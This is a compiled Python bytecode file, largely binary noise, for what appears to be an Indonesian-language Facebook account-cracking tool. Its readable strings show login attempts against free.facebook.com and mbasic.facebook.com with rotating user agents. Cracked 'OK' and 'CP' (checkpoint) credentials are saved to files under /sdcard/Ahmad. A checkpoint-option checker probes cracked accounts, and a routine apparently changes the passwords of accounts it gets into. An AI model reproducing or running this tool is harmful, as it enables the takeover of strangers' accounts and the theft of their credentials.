�U�A�A�A�c�c�c�"�"�"�E�F�F�F�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�A�A�A�c�c�c�"�"�
=�>�>�>���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �*E:Q�&A-Q�(R�Rc                 �2  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t)          j        �   �         }t"          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
��  �         t"          j        �                    �   �          d}d}|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}	|�                    dt          | �  �        z   dz   t          |�  �        z   dz   |	��  �        }
d|
�                    �   �         d         v r�d t4          v r1t6          �                    | d!z   |z   �  �         t;          | |�  �         n|t          d"t
          �d#| �d$|�d%��  �         t=          d&t>          z   d'�  �        �                    | d!z   |z   d(z   �  �         t6          �                    | d!z   |z   �  �         t          d)z  a n�d*|
j         v rgd+|
j         v r^t          d"t          �d,| �d$|�d%��  �         t=          d-tB          z   d'�  �        �                    | d!z   |z   d(z   �  �         t          d)z  a n1���# t(          j"        j#        $ r tI          j%        d.�  �         Y ��w xY wt          d)z  at)          j        �   �         }t"          j        �                    d|�d/t          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
��  �         t"          j        �                    �   �          t          j        g d0��  �        }t          j        g d1��  �        }|D �]�}	 |j&        �'                    d2d3d4d5|d6d7d8d9d:d;�
�  �         |�                    d<| z   d=z   �  �        }tQ          j)        d>t          |j         �  �        �  �        �*                    d)�  �        tQ          j)        d?t          |j         �  �        �  �        �*                    d)�  �        | d@dA|dB�}dC�+                    dD� |j,        �-                    �   �         �.                    �   �         D �   �         �  �        }|dEz  }i dFd2�dGd3�dHdI�dJd4�dKdL�dMd5�dNdO�dPd�dQ|�dRd6�dSdT�dUd7�dVd8�dWd9�dXd<| z   d=z   �dYdZ�d[d\�d]d^i�}|�/                    d_|d`|i|dat`          �b�  �        }dc|j,        �-                    �   �         �1                    �   �         v r�d t4          v r1t6          �                    | d!z   |z   �  �         t;          | |�  �         n�d td          v r�t          d(�  �         dd| � de|� �}tg          |df�g�  �        }ti          tg          |dh�i�  �        �  �         t=          djt>          z   d'�  �        �                    | d!z   |z   d(z   �  �         t6          �                    | d!z   |z   �  �         t          d)z  an��� �nLdk|j,        �-                    �   �         �1                    �   �         v �r�dQdli}dmtj          v r�|j,        �-                    �   �         }dC�+                    dn� |j,        �-                    �   �         �.                    �   �         D �   �         �  �        }t=          dotB          z   d'�  �        �                    | d!z   |z   d!z   |z   d(z   �  �         t          d(�  �         dd| � dp|� dq|� �}tg          |dr�g�  �        }ti          tg          |ds�i�  �        �  �         t          d)z  a �n d tj          v �r�|j,        �-                    �   �         }dC�+                    dt� |j,        �-                    �   �         �.                    �   �         D �   �         �  �        }t=          dotB          z   d'�  �        �                    | d!z   |z   d!z   |z   d(z   �  �         | }du}t)          j        �   �         }|�                    dv||�w�  �        j         }|�                    dx||�w�  �        j         }|dyz  }tQ          j6        dzt          |�  �        �  �        }d)}|D ]"}|d{|� d||d}         � d|d)         � d~�z  }|d)z  }�#d}}|dz  }tQ          j6        dzt          |�  �        �  �        } d}}| D ]"}|d)z  }|d�|� d||d}         � d|d)         � d��z  }�#t          d(�  �         d�| � dp|� dq|� d�|� �}tg          |dr�g�  �        }ti          tg          |d��i�  �        �  �         t          d)z  a n4n������# t(          j"        j#        $ r tI          j%        d.�  �         Y ���w xY wt          d)z  ad S )�NrK   r*  r_  u	       😛[re   r&  r�  r�  r�   r1  rM   ra  )r�  r�  z{Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; M2102J20SI Build/RQ3A.211001.001;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36zjMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36zcMozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36zpMozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zzMozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36zBMozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/103.0zMMozilla/5.0 (Android 12; Mobile; LG-M255; rv:103.0) Gecko/103.0 Firefox/103.0r4  r5  )r7  r8  r�  z�Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36r/  z�Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36r9  r:  u	       😝[r�  r�  r�  r�  r�  r�  r�  rl  r�  r�  r�  r�  r�  r=  r�  r�  r�  r  u   ╰───z[CP] ry  r�  r  r�   rx   r   r�  r�  z[OK] r  r   u	       😜[r2  r6  r  r>  r?  r/   r@  rA  rB  rC  rD  rE  z;https://free.facebook.com/login/device-based/password/?uid=r  rQ  rR  z,https://free.facebook.com/login/save-device/rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zchangfb.<locals>.<listcomp>y  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  zhttps://free.facebook.comrk  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  z#ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7r  r  r  r�   Frs  rv  r  r  r�  r  zAhmad CPr  z/sdcard/Ahmad/CP/r|  r  r�  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zchangfb.<locals>.<listcomp>�  r�  r   r  r�  r�  r  zCHANG OKc                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zchangfb.<locals>.<listcomp>�  r�  r   rC   r�  r�  r�  r  r�  r  r  r   r  r  r�  r�  r  r  z"[bold green]Ahmad  OK[/bold green])7r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r�   r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�  r�   r�   r�   r�   r>  r  r�   r�   r�   r�   r�   r�  r�  r�  r�  r�  r�  r�   r�   r�  r�   )!r
  r  r�  r�  r�  r�   r�  r�   r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  s!                                    r   r�  r�    sV  � ��m�Q�q��A�a��O�$�$���S���S�����
�������4�4�4��C��������B�B�B�s�SW�y�y�y�Y\�]`�Ya�Ya�Ya�Ya�bc�bc�bc�d�jm�n�n�n�n�or�oy�o�o�  pB�  pB�  pB��m� � � � � ��. �}� � � � � ��* ����������2�2�2�d�d�d�3�s�8�8�8�8�TV�TV�TV�WY�WY�WY�Z]�^b�Zc�Zc�Zc�dg�hk�dl�dl�dl�dl�mn�mn�mn�o�p�p�p�qt�q{�  rB�  rB�  rD�  rD�  rD� c�� d��� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�1�1�1�S�S�S����<�=�=�=�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�!�!�!�C�C�C����
;�<�<�<���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q�������������2�2�2�d�d�d�3�s�8�8�8�8�TV�TV�TV�WY�WY�WY�Z]�^b�Zc�Zc�Zc�dg�hk�dl�dl�dl�dl�mn�mn�mn�o�p�p�p�qt�q{�  rB�  rB�  rD�  rD�  rD��m� � � � � �� �}� � � � � �� � E� E�R�D��;���2�K�dh�  GJ�  Y\�  gp�  CP�  ci�  |C�  W|�  }�  }�  ~�  ~�  ~�
�w�w�L�S�P�Q|�|�}�}�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iW�  _m�  uw�  y�  y�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
~�&�%�  
~�o�{�  
~�;�Pz�  
~�  |N�  PT�  
~�  Ui�  kv�  
~�  wR�  TW�  
~�  X`�  b}�  
~�  ~L�  Nq�  
~�  r~�  @B�  
~�  CK�  MV�  
~�  Wi�  k{�  
~�  |L�  N[�  
~�  \l�  nt�  
~�  uE	�  G	N	�  
~�  O	X	�  Z	W
�  X
[
�  Z	[
�  \
G�  Z	G�  
~�  HY�  [n�  
~�  o@�  Bg�  
~�  ht�  v}�  
~�  
~�5����Y�_d�nv�x|�m}�  GL�  ]b�  kp��  	q�  	q�2��b�j�)�)�+�+�0�0�2�2�2�2��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�	����
�4�[�[�[�?�C�?�?�2�?�?�X��X�U�+�+�+�Y�
�3�y�
�+�+�+�,�,�,�	�
�c�
!�#�&�&�,�,�S��W�R�Z��_�=�=�=�	�[�[��S���������U�R�R�	�	�E��C�K�(�(�*�*�/�/�1�1�1�1��  T�  U�G��y���
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
�c�
!�#�&�&�,�,�S��W�R�Z��^�D�-@��-E�F�F�F�
�4�[�[�[�Y�C�Y�Y�B�Y�Y�SW�Y�Y�X��X�W�-�-�-�Y�
�3�y�
�+�+�+�,�,�,���U�R�
�U�	��	�	�
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
�c�
!�#�&�&�,�,�S��W�R�Z��^�D�-@��-E�F�F�F�
�T��X���!�!�W��K�K�X�ae�nu�K�v�v�{�T�
�+�+�T�]a�jq�+�
r�
r�
w�S��Q�R�X��j�{�|�  AD�  }E�  }E�  F�  F�X�	
�S�� � ���M��M�M��q�	�M�M�F�1�I�M�M�M�N�h�	�1�f�c�c�	
�S��U�V�X��J�y�z}�  C�  {D�  {D�  E�  E�V�	
�S�� T� T��	�1�f�c��R�C�R�R�6�!�9�R�R�v�a�y�R�R�R�S�h�h�
�4�[�[�[�~��~�~��~�~�_c�~�~�t|�~�~�X��X�W�-�-�-�Y�
�3�y� D�E�E�E�F�F�F���U�R�
�U�9 
�@ �A 
��B 
�	�	,� � � ��:�b�>�>�>�>�>������q����sA   �?E:N-�;A.N-�-(O�O� I<i�D)i�-G*i�i�(j
�	j
c                  �n
  � t          t          �  �        } d| z  }t          t          |d��  �        �  �         t	          t
          dz   t          z   dz   t
          z   dz   �  �         d}t          �   �         �                    t          |d�	�  �        �  �         d
}t          D �]S}	 	 |�
                    d�  �        d
         |�
                    d�  �        d         }}ne# t          $ rX t          j        d�  �         t          dt          �d|�dt
          ���  �         t          dt          �dt
          ���  �         Y ��w xY wt!          j        t          t$          t&          t          t          t(          g�  �        }t          d|�d|�dt          t          �  �        �d|�dt
          ��
d��  �         t*          j        �                    �   �          d}t1          j        �   �         }	ddddd|ddd d!d"d#d$d%d&d'�}
|	�                    d�  �        }t7          |	�                    d(||d)d*�|
d+�,�  �        j        d-�  �        }d.|	j        �                    �   �         �                     �   �         v �r�	 |�!                    d/�  �        }i }g d0�} |d1�  �        D ]V}|�                    d2�  �        |v r=|�"                    |�                    d2�  �        |�                    d3�  �        i�  �         �Wt7          |	�                    dtG          |d4         �  �        z   ||
�5�  �        j        d-�  �        }t          dt          �d|�d|�d6t
          ���  �         |�$                    d7�  �        }t          |�  �        d
k    r!t          dt(          �d8t
          �d9��  �         n+|D ](}t          dt&          �d|j        �t
          ���  �         �)n�#  t          dt          �d|�d|�d6t
          ���  �         t          dt          �d:t
          ���  �         Y n{xY wd;|	j        �                    �   �         �                     �   �         v r&t          dt          �d|�d|�d<t
          ���  �         n%t          dt
          �d|�d|�d=t
          ���  �         |dz  }���# t0          j%        j&        $ rS t          d>�  �         d?}t          �   �         �                    t          |d@�	�  �        �  �         tO          �   �          Y ��Qw xY wdA}t          �   �         �                    t          |d�	�  �        �  �         tO          �   �          d S )BNzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr  r�   rE  z] Mulaiz# PROSES CEK OPSI DIMULAIr  r  r   r  r   r$   r_  z++++ z ----> Error      z----> Pemisah Tidak Didukung Untuk Program Iniz---> re   z ---> { r`  rM   ra  z{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r  r>  r/   rd  rl  z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�  rA  �navigater?  r�  z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8zgzip, deflaterD  r�  z%https://mbasic.facebook.com/login.phpr  )�emailrZ  r�   T)r�  r>  rt  r?  rv  �form)�nhrW  �fb_dtsgzsubmit[Continue]�checkpoint_datar�   r�   ra  �action)r�  r>  z ----> CP       �optionz,---> Tap Yes / A2F (Cek Login Di Lite/Mbasic�)z---> Tidak Dapat Mengecek Opsir|  z ----> OK       z ----> SALAH       rC   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIr�  z# DONE)(r
   r�  r�   r�   r�   r�   r�   r  r   r  r  �
IndexErrorr�   r�   r�   r�   r�   r�   r�   r�  r�  r�   r�   r�   r~   r�   r   r�  r�  r�   r�   r�  r�  rJ  r  r   rM  r�   r�   r�   )r�  r�  r�  �love�kesr�   r�  r�  r�   r�   �header�hi�ho�jor�  �lion�anj�kent�opsi�opsii�li�dahs                         r   r  r  �  sU  � ���Y�Y��`�bc�d���s�2�Z� � � �!�!�!��q��u�Q�w�u�}�Q��y� �!�!�!�"�������T�#�W�%�%�%�&�&�&�	��� ,
� ,
�S�+
���I�I�c�N�N�1��c�i�i��n�n�Q�/�r�B�B��
� � � ��J�q�M�M�M�	�E�Q�Q�Q�s�s�s�1�1�
5�6�6�6�	�E����1�1�
E�F�F�F��H�	����
 	��q��2�a��"�o�&�&�2��5����D�D�D��T�����2�2�2�a�a�	@�c�J�J�J�J�3�:�K[�K[�K]�K]�K]� 	F�2�	�	�	�	�3�*�K�eh�  tQ�  bE�  TV�  a_�  tA�  Ta�  t~�  QU�  hr�  ~z�  N	]	�  q	V
�  W
�  W
�6����-�.�.�2��C�H�H�<�B�VX�ai�Cj�Cj�tz�  MQ�H�  R�  R�  W�  Xe�  	f�  	f�2��c�k�*�*�,�,�1�1�3�3�3�3�9�
�'�'�&�/�/�R��T�K�K�K�T���7��� 7� 7��	������D�	 �	 ��{�{�C�G�G�F�O�O�C�G�G�G�$4�$4�5�6�6�6������6�s�2�h�<�7H�7H�H�t�]c��d�d�i�jw�x�x�T�
�U�q�q�q����B�B�B�q�q�9�:�:�:��M�M�(�#�#�T��D�	�	�1����e�2�2�2�a�a�a�H�I�I�I�I�� 0� 0�%��u�b�b�b����A�A�.�/�/�/�/���9�
�U�q�q�q����B�B�B�q�q�9�:�:�:�
�U�1�1�1�Q�Q�7�8�8�8�8�8�����C�K�(�(�*�*�/�/�1�1�1�1�	�E�a�a�a����2�2�2�a�a�
8�9�9�9�9�	�E����2�2�2�b�b�b���
;�<�<�<���7�4�4��	�	�	,� 
� 
� 
���9�9�9�<�2��5�5�;�;�t�B�e�$�$�$�%�%�%��6�6�6�6�6�	
����
 �������T�#�W�%�%�%�&�&�&������sN   �%6C�R�AD>�;R�=D>�>D*R�)EO� R�AP	�BR�A#S2�1S2�__main__ztouch .prox.txtr  r
  )r   r   r   )�r~   �bs4r�   r�   r�   r�   r   r�   r�   r   r�   r�   �quitr   �platform�urllib3�rich�base64�
rich.tabler   �me�rich.consoler   r  r   r�  rI  �concurrent.futuresr   r  r   �gp�
rich.panelr   r�   r�   �rich.markdownr    r  �rich.columnsr!   r�  �rprintr"   �	rich.textr#   �tekz�web_fb�url_businness�ua_business�uname�plist�basex�encode�basex1�	b64encode�basex2�decode�basex3�upper�base4rK  �	basesplit�install�CON�ua01�ua02�ua03�ua04�ua05�ua06r  r|   �ugen_�ugen__�link_app�prox_k�id_ri�iddr�   r�  r�  r�  �yyy�apk_me�pass_r�  �prox_�opsi_y�url_met�pass_man�fpsr�  r�   r�   r�  r   r�   r�  ry   r�   r�   r�   rz   r{   r  �xdr�   �	randranger�   r�  r   �frk  r�   �i�jr�   r�   r}   r�   r�   �l�uaku2�uak�ugen3r�  r�  r�  �	lisensikur�  r�   r�  �lisensikunir  r  r�   rW   r2   rR   rU   r*   r[   rV   r8   r_   r   r�  r�   r�  r�   �dic�dic2r	   r   �tglr   r   �blnr   �thnr�  r   r�   r�   r�   r�   r�   r�   r�   r  r�   re  r5  r�   rO  r�   r�   r�   r�  r�  r�   r4  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r  �__name__�mkdirr�   r   r   �<module>r�     sO  �� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� � � � �� � � � �F�4��"���� 	��	�
)� *� *� *�� I�T�	�T�
G�H�H�H� 	��	�
)� *� *� *� ��� � � � @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� @� � � � � � � � � � � � � "� "� "� "� "� "� '� '� '� '� '� '� $� $� $� $� $� $� '� '� '� '� '� '� 9� 9� 9� 9� 9� 9� $� $� $� $� $� $� #� #� #� #� #� #� � � � � � � *� *� *� *� *� *� '� '� '� '� '� '�  �  �  �  �  �  � � � � � � � "� "� "� "� "� "� 
%��/�� _��	���	�	�1�����	���g�	�	��	��	�&�	!�	!��	���w�	�	��	�������M�M�#�s�#�#�+�+�C��5�5�=�=�c�3�G�G�O�O�PS�UX�Y�Y�a�a�be�gj�k�k�s�s�tw�y|�}�}�  F�  F�  GJ�  LO�  P�  P�  X�  X�  Y\�  ^a�  b�  b�  j�  j�  kn�  ps�  t�  t�  |�  |�  }@�  BE�  F�  F�  N�  N�  OR�  TW�  X�  X�	� ��� � � ��C�E�E�� �  @�� �  @�� B�  B�  B�� O�  O�  O�� c�  c�  c�� c�  c�  c���2�b��� ��d�5��df�gi�kz�j{�|~�  @B�  CD�  EG�  HJ�  KR�  SZ�  []�  ^`�  ac�  dj�  km�  np�  qs�  es� a����c�"�T�"�R��F�5���f�W�U]�^a� 	����
���H�����	��?��x�|�^�_�_�d����k�#�����T�"�"�"�"��� ?� ?� ?���=�>�>�>�>�>�>�>�>�����?����	�T�+�c�����!�!�,�,�.�.��
�%��,�,� � �B�&���6��A�q�����6��A�q����
���6��C�����q���6��A�q�����6��A�q�����6��A�q�����6��A�q������
�1�Q�1�1��1�1�Q�1��1�1�1�a�1�1�!�1�1�a�1�1�!�1�1�a�1�1�����d���� %���6�=�1�1�1�2�2�����6�=�  S�  S�  S�  T�  T���6��A�s�����6�=�  S�  S�  S�  T�  T��3���6��B�s�������6��D������6��B�s������
�8�8�q�8�8�A�8�q�8�!�8�Q�8�8�!�8�Q�8�8��8�8�Q�8�8��8�8�Q�8�8�����U�����	��r��� 0� 0�A�'���6��C������6��C������6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6��A�q����H���6��A�q�����6��A�q����$��	�/�1�/�/�q�/�!�/�Q�/��/�1�/�a�/��/�A�/�/��/�/�A�/�/��� 	E|	�  	E|	�  	E|	��0� 0� 0� RT�TV�WX�YZ�[\�]_�`b�ce�fh�ik�ln�oq�rt�Qt� O��3�t�B�r�$�u�V�I�i���K�
������� �������������������������������������� ���G��&�U[�`h�mx�  H�  NX�  ^h�  i�  i���J�G��e�QW�]c�iq�  xC�  IR�  Xb�  hr�  s�  s��������!��	�3�3�x� �$�$�&�&�,�-�-�/��������"���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5��� � �	� 	� 	�S� S� S�Z� Z� Z�$� � �"	� 	� 	�,	� 	� 	�8� � �p	� p	� p	�d �C�%��'�%�-��/�#�
��� � �'� '� '�P?	� ?	� ?	�B	� 	� 	�<.	� .	� .	�d	� 	� 	�4/� /� /�`+V� +V� +V�Z,� ,� ,�^<� <� <�~� � �&c	� c	� c	�Ha	� a	� a	�DA	� A	� A	�Dt	� t	� t	�l3	� 3	� 3	�j3	� 3	� 3	�j(	� (	� (	�T3	� 3	� 3	�lQ	� Q	� Q	�h7	� 7	� 7	�r5	� 5	� 5	�n(	� (	� (	�T3	� 3	� 3	�jQ	� Q	� Q	�j	� 	� 	�F,	� ,	� ,	�^4	� 4	� 4	�l(	� (	� (	�X;	� ;	� ;	�~%	� %	� %	�Pd	� d	� d	�R7� 7� 7�r �Z����R�Y� �!�!�!�!���������R�X�d�^�^�^�^���������R�X�d�^�^�^�^��������������� �s<   �64K+ �+L�0L � L�] �]"�%]6 �6]:�=^ �^